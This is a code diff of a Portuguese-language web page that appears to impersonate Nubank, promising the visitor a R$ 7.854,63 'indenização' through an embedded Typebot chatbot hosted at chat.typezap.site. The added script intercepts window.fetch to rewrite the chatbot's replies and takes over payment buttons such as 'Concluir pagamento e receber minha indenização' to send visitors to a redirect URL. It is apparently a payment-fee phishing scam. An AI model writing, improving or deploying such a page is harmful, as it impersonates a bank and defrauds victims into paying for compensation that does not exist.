@@ -5,90 +5,65 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Saque da Indenização</title>
-  <!-- Substitua o CDN por um arquivo local em produção -->
-  <link href="css/tailwind.css" rel="stylesheet">
+  <!-- Usando Tailwind via CDN (para desenvolvimento) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Estilos básicos como fallback */
+    body { background-color: #831BD1; min-height: 100vh; display: flex; flex-direction: column; }
+    header { background-color: white; padding: 0 1rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
+    .container { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; gap: 1.5rem; }
+    .logo { height: 4rem; width: auto; }
+    .main-content { flex: 1; padding: 0 1rem; padding-top: 0.5rem; }
+    .chat-container { background-color: white; border: 1px solid #d1d5db; border-radius: 0.375rem; width: 100%; height: calc(100vh - 80px); overflow: hidden; }
+  </style>
 </head>
 
-<body class="bg-[#831BD1] min-h-screen flex flex-col">
-  <header class="bg-white px-4 shadow-md">
-    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
-      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
+<body>
+  <header>
+    <div class="container">
+      <img src="images/logo.svg" alt="Nubank" class="logo">
     </div>
   </header>
 
-  <main class="flex-1 px-4 py-2">
-    <div class="flex flex-col">
-      <main>
-        <div class="max-h-min">
-          <div class="px-0.5 pb-[0.6rem]">
-            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
-              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
-                <p class="text-base">
-                  <span>Olá, </span>
-                  <span class="text-black font-bold">USUáRIO!</span>
-                </p>
-                <p class="mt-1 text-sm">
-                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
-                </p>
-              </div>
+  <main class="main-content">
+    <div style="display: flex; flex-direction: column;">
+      <div style="max-height: min-content;">
+        <div style="padding: 0 0.125rem; padding-bottom: 0.6rem;">
+          <div class="chat-container">
+            <div style="padding: 1rem; padding-top: 1rem; padding-bottom: 0; text-align: center; max-width: 28rem; margin: 0 auto; color: black;">
+              <p style="font-size: 1rem; line-height: 1.5rem;">
+                <span>Olá, </span>
+                <span style="color: black; font-weight: bold;">USUÁRIO!</span>
+              </p>
+              <p style="margin-top: 0.25rem; font-size: 0.875rem; line-height: 1.25rem;">
+                Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
+              </p>
+            </div>
 
-              <!-- Typebot - Coloque o elemento ANTES do script -->
-              <typebot-standard></typebot-standard>
+            <!-- Typebot -->
+            <typebot-standard></typebot-standard>
 
-              <script type="module">
-                import { initStandard } from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';
-
-                // Função para garantir que o elemento existe
-                function ensureTypebotElement() {
-                  if (!document.querySelector('typebot-standard')) {
-                    const typebotEl = document.createElement('typebot-standard');
-                    document.querySelector('.overflow-hidden').appendChild(typebotEl);
-                  }
-                }
-
-                async function initializeTypebot() {
-                  try {
-                    ensureTypebotElement();
-                    
-                    await initStandard({
-                      typebot: "nub-1-mcrdbzs",
-                      apiHost: "https://chat.typezap.site",
-                    });
-                    
-                    console.log('Typebot inicializado com sucesso');
-                    initRedirectionSystem();
-                  } catch (error) {
-                    console.error('Erro ao inicializar Typebot:', error);
-                    // Tenta novamente após 2 segundos
-                    setTimeout(initializeTypebot, 2000);
-                  }
-                }
-
-                // Inicia após o DOM estar completamente carregado
-                if (document.readyState === 'complete') {
-                  initializeTypebot();
-                } else {
-                  window.addEventListener('load', initializeTypebot);
-                }
-              </script>
-
-              <script>
+            <script>
               // Sistema de Redirecionamento
               function initRedirectionSystem() {
-                const TARGET_TEXT = "Concluir pagamento e receber minha indenização";
+                const TARGET_TEXTS = [
+                  "Concluir pagamento e receber minha indenização",
+                  "Finalizar processo",
+                  "Confirmar recebimento"
+                ];
                 const REDIRECT_URL = "https://google.com";
                 
                 // 1. Interceptação de API
                 const originalFetch = window.fetch;
                 window.fetch = async function(input, init) {
-                  const url = typeof input === 'string' ? input : input.url;
+                  const url = typeof input === 'string' ? input : input?.url;
                   if (url && url.includes('/continueChat')) {
                     try {
                       const response = await originalFetch.apply(this, arguments);
                       const clonedResponse = response.clone();
                       const data = await clonedResponse.json();
                       
-                      if (JSON.stringify(data).includes(TARGET_TEXT)) {
+                      if (TARGET_TEXTS.some(text => JSON.stringify(data).includes(text))) {
                         data.messages = data.messages.map(msg => {
                           if (msg.content?.richText) {
                             msg.content.richText = msg.content.richText.map(rich => ({
@@ -147,7 +122,11 @@
               }
 
               function scanAndReplaceInNode(node) {
-                const TARGET_TEXT = "Concluir pagamento e receber minha indenização";
+                const TARGET_TEXTS = [
+                  "Concluir pagamento e receber minha indenização",
+                  "Finalizar processo",
+                  "Confirmar recebimento"
+                ];
                 const REDIRECT_URL = "https://google.com";
                 
                 try {
@@ -156,7 +135,8 @@
                     : [];
                   
                   elements.forEach(el => {
-                    if (el.textContent?.includes(TARGET_TEXT) && !el.dataset.intercepted) {
+                    const elementText = el.textContent?.trim() || '';
+                    if (TARGET_TEXTS.some(text => elementText.includes(text)) && !el.dataset.intercepted) {
                       el.dataset.intercepted = 'true';
                       
                       if (el.tagName === 'A') {
@@ -167,21 +147,46 @@
                       el.onclick = function(e) {
                         e.preventDefault();
                         e.stopPropagation();
+                        console.log('🔗 Redirecionando para:', REDIRECT_URL);
                         window.open(REDIRECT_URL, '_blank');
                       };
                       
-                      console.log('🔗 Elemento interceptado:', el);
+                      console.log('🎯 Elemento interceptado:', el.textContent.trim());
                     }
                   });
                 } catch (e) {
                   console.error('Erro ao verificar nó:', e);
                 }
               }
-              </script>
-            </div>
+
+              // Carrega o Typebot de forma alternativa
+              function loadTypebot() {
+                const script = document.createElement('script');
+                script.src = 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';
+                script.onload = function() {
+                  if (window.Typebot && window.Typebot.initStandard) {
+                    window.Typebot.initStandard({
+                      typebot: "nub-1-mcrdbzs",
+                      apiHost: "https://chat.typezap.site",
+                    }).then(() => {
+                      console.log('Typebot carregado com sucesso');
+                      initRedirectionSystem();
+                    });
+                  }
+                };
+                document.head.appendChild(script);
+              }
+
+              // Inicia quando o DOM estiver pronto
+              if (document.readyState === 'complete') {
+                loadTypebot();
+              } else {
+                window.addEventListener('load', loadTypebot);
+              }
+            </script>
           </div>
         </div>
-      </main>
+      </div>
     </div>
   </main>
 </body>
